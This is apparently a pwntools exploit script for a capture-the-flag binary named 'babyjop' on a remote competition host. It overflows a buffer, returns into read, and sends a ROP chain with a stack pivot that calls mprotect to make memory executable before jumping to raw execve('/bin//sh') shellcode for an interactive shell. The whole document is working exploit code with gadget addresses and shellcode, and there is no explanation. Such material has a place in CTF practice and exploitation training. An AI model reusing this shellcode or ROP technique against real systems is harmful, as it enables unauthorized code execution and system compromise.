from pwn import *
#io = process("./babyjop")
io = remote("remote1.thcon.party","10902")
padding = b"A" * 0x80
read = p64(0x401e8a)

#Gadgets
content = p64(0x4c3300)
stackPivot = p64(0x452781)
popRdi = p64(0x4018ca)
popRsi = p64(0x40f4fe)
popRdx = p64(0x4017cf)
popRbx = p64(0x40209b)
mprotect = p64(0x4522c0)
shlcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

retToRead = padding + read
io.sendline("1")
io.send(retToRead)

#To get rid of the bunch of pops at the stack pivot 
exploit =  shlcode + b"A" * (88 - len(shlcode))
exploit += popRdi + p64(0x4c3000) + popRsi + p64(1000) + popRbx  #setup mprotect arguments and use rbx to skip through the stackPivot while rop
exploit += stackPivot
exploit += popRdx + p64(7) + mprotect + content

io.send(exploit)
io.interactive()
